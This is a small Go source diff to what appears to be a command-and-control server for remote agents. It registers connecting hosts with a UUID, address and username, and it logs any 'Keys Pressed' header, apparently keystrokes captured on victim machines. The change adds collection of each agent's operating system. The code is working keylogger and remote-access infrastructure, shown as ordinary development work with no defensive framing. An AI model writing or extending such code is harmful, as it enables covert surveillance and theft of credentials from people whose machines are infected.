@@ -35,12 +35,14 @@ func requestHandler() http.HandlerFunc {
 		if r.Header.Get("Register") == "true" {
 			uuid, _ := uuid.NewRandom()
 			w.Write([]byte(uuid.String()))
-			State.RegisteredAgents = append(State.RegisteredAgents, Agent{UUID: uuid.String(), Hostname: r.RemoteAddr, Username: r.Header.Get("Username")})
+			State.RegisteredAgents =
+				append(State.RegisteredAgents, Agent{UUID: uuid.String(), Hostname: r.RemoteAddr, Username: r.Header.Get("Username"), OS: r.Header.Get("OS")})
 			logger.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
 		} else if strings.TrimSpace(r.Header.Get("UUID")) == State.SelectedAgent.Alias || "ALL" == State.SelectedAgent.Alias {
 			logger.Debug("Connected Agent:")
 			logger.Debug("Address: " + r.RemoteAddr)
 			logger.Debug("Username: " + r.Header.Get("Username"))
+			logger.Debug("Operating System: " + r.Header.Get("OS"))
 			if r.Header.Get("Keys") != "" {
 				logger.Debug("Keys Pressed: " + r.Header.Get("Keys"))
 			}
